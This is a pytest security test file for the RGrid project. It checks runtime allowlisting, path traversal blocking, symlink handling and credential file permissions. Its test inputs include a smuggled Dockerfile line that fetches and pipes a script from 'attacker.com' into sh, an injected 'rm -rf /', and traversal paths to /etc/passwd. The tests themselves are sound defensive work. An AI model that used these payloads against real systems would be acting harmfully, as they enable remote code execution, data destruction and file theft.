"""Security tests for RGrid (Phase 2 Security Audit).

These tests verify that security vulnerabilities have been properly addressed:
- CRITICAL: Runtime validation (prevent arbitrary Docker images)
- HIGH: Path traversal in file downloads
- HIGH: Symlink attacks in output collection
- HIGH: Path traversal in CLI downloads
- MEDIUM: Config directory permissions

Security Audit conducted: 2024 Phase 2 Stabilization Sprint
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

# Runtime security tests
from rgrid_common.runtimes import (
    resolve_runtime,
    UnsupportedRuntimeError,
    DOCKER_IMAGE_PATTERN,
)

# File handler security tests
from runner.file_handler import (
    validate_safe_filename,
    PathTraversalError,
)

# Output collector security tests
from runner.output_collector import collect_output_files

# CLI security tests
from rgrid.batch_download import (
    validate_safe_path,
    sanitize_output_dirname,
    construct_output_path,
    PathTraversalError as CLIPathTraversalError,
)
from rgrid.commands.download import sanitize_filename
from rgrid.config import RGridConfig


class TestRuntimeSecurity:
    """CRITICAL: Test runtime validation to prevent Dockerfile injection."""

    def test_dockerfile_injection_via_newline_blocked(self):
        """Verify Dockerfile injection via newline is blocked."""
        malicious = "python:3.11\nRUN curl http://attacker.com/payload | sh"
        with pytest.raises(UnsupportedRuntimeError):
            resolve_runtime(malicious)

    def test_dockerfile_injection_via_multi_from_blocked(self):
        """Verify multi-stage Dockerfile injection is blocked."""
        malicious = "python:3.11\nFROM alpine\nRUN malicious_command"
        with pytest.raises(UnsupportedRuntimeError):
            resolve_runtime(malicious)

    def test_arbitrary_image_blocked(self):
        """Verify arbitrary Docker images are blocked."""
        arbitrary_images = [
            "malicious/image:latest",
            "docker.io/library/ubuntu:22.04",
            "ghcr.io/some/image:v1",
            "localhost:5000/internal:latest",
        ]
        for image in arbitrary_images:
            with pytest.raises(UnsupportedRuntimeError):
                resolve_runtime(image)

    def test_only_allowlisted_runtimes_accepted(self):
        """Verify only explicitly allowlisted runtimes work."""
        valid_runtimes = [
            "python", "python3.11", "python3.12", "python3.10", "python3.9",
            "node", "node20", "node18",
            "python:3.11", "python:3.12", "node:20",
        ]
        for runtime in valid_runtimes:
            result = resolve_runtime(runtime)
            assert ":" in result  # Should be a valid Docker image

    def test_docker_image_pattern_validation(self):
        """Verify Docker image pattern catches injection attempts."""
        invalid_patterns = [
            "python:3.11\nRUN",
            "node:20\x00malicious",
            "python:3.11;rm -rf /",
        ]
        for pattern in invalid_patterns:
            assert not DOCKER_IMAGE_PATTERN.match(pattern)


class TestFileHandlerSecurity:
    """HIGH: Test path traversal prevention in file downloads."""

    def test_path_traversal_dotdot_blocked(self):
        """Verify .. path traversal is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            with pytest.raises(PathTraversalError) as exc_info:
                validate_safe_filename("../../../etc/passwd", base_dir)
            assert "Path traversal" in str(exc_info.value)

    def test_path_traversal_nested_dotdot_blocked(self):
        """Verify nested .. path traversal is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            with pytest.raises(PathTraversalError):
                validate_safe_filename("subdir/../../../etc/passwd", base_dir)

    def test_absolute_path_blocked(self):
        """Verify absolute paths are blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            with pytest.raises(PathTraversalError) as exc_info:
                validate_safe_filename("/etc/passwd", base_dir)
            assert "Absolute path" in str(exc_info.value)

    def test_null_byte_blocked(self):
        """Verify null byte injection is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            with pytest.raises(PathTraversalError) as exc_info:
                validate_safe_filename("file.txt\x00.jpg", base_dir)
            assert "Null byte" in str(exc_info.value)

    def test_valid_filename_accepted(self):
        """Verify valid filenames work correctly."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            valid_names = ["file.txt", "data.csv", "subdirectory/file.txt"]
            for name in valid_names:
                result = validate_safe_filename(name, base_dir)
                assert str(base_dir) in str(result)


class TestOutputCollectorSecurity:
    """HIGH: Test symlink attack prevention in output collection."""

    def test_symlink_to_sensitive_file_skipped(self):
        """Verify symlinks to sensitive files are skipped."""
        with tempfile.TemporaryDirectory() as tmpdir:
            work_dir = Path(tmpdir)

            # Create a regular file
            regular_file = work_dir / "regular.txt"
            regular_file.write_text("normal content")

            # Create a symlink to /etc/passwd (if it exists)
            symlink_file = work_dir / "passwd_link"
            try:
                symlink_file.symlink_to("/etc/passwd")
            except (OSError, PermissionError):
                pytest.skip("Cannot create symlink in test environment")

            # Collect outputs
            outputs = collect_output_files(work_dir)

            # Should only contain the regular file, not the symlink
            filenames = [o["filename"] for o in outputs]
            assert "regular.txt" in filenames
            assert "passwd_link" not in filenames

    def test_symlink_directory_not_followed(self):
        """Verify symlinked directories are not followed."""
        with tempfile.TemporaryDirectory() as tmpdir:
            work_dir = Path(tmpdir)

            # Create a regular file
            regular_file = work_dir / "regular.txt"
            regular_file.write_text("normal content")

            # Create another temp dir to link to (simulating sensitive directory)
            with tempfile.TemporaryDirectory() as external_dir:
                external_path = Path(external_dir)
                # Create a file in the external directory
                external_file = external_path / "sensitive.txt"
                external_file.write_text("sensitive data")

                # Create symlink to external directory
                symlink_dir = work_dir / "external_link"
                try:
                    symlink_dir.symlink_to(external_path)
                except (OSError, PermissionError):
                    pytest.skip("Cannot create symlink in test environment")

                outputs = collect_output_files(work_dir)

                # Should only contain files from work_dir, not from external_link
                filenames = [o["filename"] for o in outputs]
                # regular.txt should be there
                assert "regular.txt" in filenames
                # Files from the symlinked directory should NOT be there
                assert "external_link/sensitive.txt" not in filenames
                # Double check paths don't include the external directory
                for output in outputs:
                    assert external_dir not in output["path"]

    def test_regular_files_collected(self):
        """Verify regular files are collected correctly."""
        with tempfile.TemporaryDirectory() as tmpdir:
            work_dir = Path(tmpdir)

            # Create nested structure with regular files
            (work_dir / "output.txt").write_text("output")
            (work_dir / "subdir").mkdir()
            (work_dir / "subdir" / "nested.txt").write_text("nested")

            outputs = collect_output_files(work_dir)

            filenames = [o["filename"] for o in outputs]
            assert "output.txt" in filenames
            assert "subdir/nested.txt" in filenames


class TestCLIDownloadSecurity:
    """HIGH: Test path traversal prevention in CLI downloads."""

    def test_cli_path_traversal_dotdot_blocked(self):
        """Verify .. path traversal is blocked in CLI."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(CLIPathTraversalError):
                validate_safe_path("../../../etc/passwd", tmpdir)

    def test_cli_null_byte_blocked(self):
        """Verify null byte injection is blocked in CLI."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(CLIPathTraversalError):
                validate_safe_path("file.txt\x00malicious", tmpdir)

    def test_cli_absolute_path_escape_blocked(self):
        """Verify absolute path escape is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(CLIPathTraversalError):
                validate_safe_path("/etc/passwd", tmpdir)

    def test_sanitize_dirname_removes_traversal(self):
        """Verify directory name sanitization removes traversal sequences."""
        result = sanitize_output_dirname("/tmp", "../../../etc")
        assert ".." not in result
        assert "/" not in result

    def test_sanitize_filename_removes_path_components(self):
        """Verify filename sanitization removes directory components."""
        malicious_names = [
            "../../../etc/passwd",
            "/etc/passwd",
            "subdir/../../../etc/passwd",
        ]
        for name in malicious_names:
            result = sanitize_filename(name)
            assert "/" not in result
            assert ".." not in result

    def test_sanitize_filename_handles_null_byte(self):
        """Verify null bytes are removed from filenames."""
        result = sanitize_filename("file.txt\x00malicious")
        assert "\x00" not in result

    def test_construct_output_path_validates_path(self):
        """Verify construct_output_path validates against traversal."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(CLIPathTraversalError):
                construct_output_path(tmpdir, "../../../etc/passwd", preserve_structure=True)


class TestConfigSecurity:
    """MEDIUM: Test credential storage security."""

    def test_config_directory_permissions(self):
        """Verify config directory is created with restrictive permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Mock home directory
            with patch.object(Path, 'home', return_value=Path(tmpdir)):
                config = RGridConfig()
                config.config_dir = Path(tmpdir) / ".rgrid"
                config.credentials_file = config.config_dir / "credentials"

                config.ensure_config_dir()

                # Check directory permissions (should be 0700)
                dir_mode = config.config_dir.stat().st_mode & 0o777
                assert dir_mode == 0o700, f"Expected 0700, got {oct(dir_mode)}"

    def test_credentials_file_permissions(self):
        """Verify credentials file is created with restrictive permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            config = RGridConfig()
            config.config_dir = Path(tmpdir)
            config.credentials_file = config.config_dir / "credentials"

            # Ensure directory exists
            config.config_dir.mkdir(parents=True, exist_ok=True)

            # Save credentials
            config.save_credentials("test_api_key", "http://localhost:8000")

            # Check file permissions (should be 0600)
            file_mode = config.credentials_file.stat().st_mode & 0o777
            assert file_mode == 0o600, f"Expected 0600, got {oct(file_mode)}"


class TestSecurityRegressions:
    """Tests to prevent security regression."""

    def test_all_runtime_map_entries_match_pattern(self):
        """Verify all RUNTIME_MAP entries are valid Docker image names."""
        from rgrid_common.runtimes import RUNTIME_MAP, DOCKER_IMAGE_PATTERN

        for key, value in RUNTIME_MAP.items():
            if ":" in value:  # Full image name
                assert DOCKER_IMAGE_PATTERN.match(value), \
                    f"RUNTIME_MAP value '{value}' doesn't match Docker image pattern"

    def test_no_shell_true_in_subprocess(self):
        """Verify no subprocess calls use shell=True (code audit helper)."""
        # This is a static check - grep for shell=True in Python files
        import subprocess
        result = subprocess.run(
            ["grep", "-r", "shell=True", "runner/", "api/", "cli/"],
            capture_output=True,
            text=True,
            cwd=Path(__file__).parent.parent.parent
        )
        # If any shell=True found, fail with the location
        if result.stdout.strip():
            pytest.fail(f"Found shell=True usage:\n{result.stdout}")
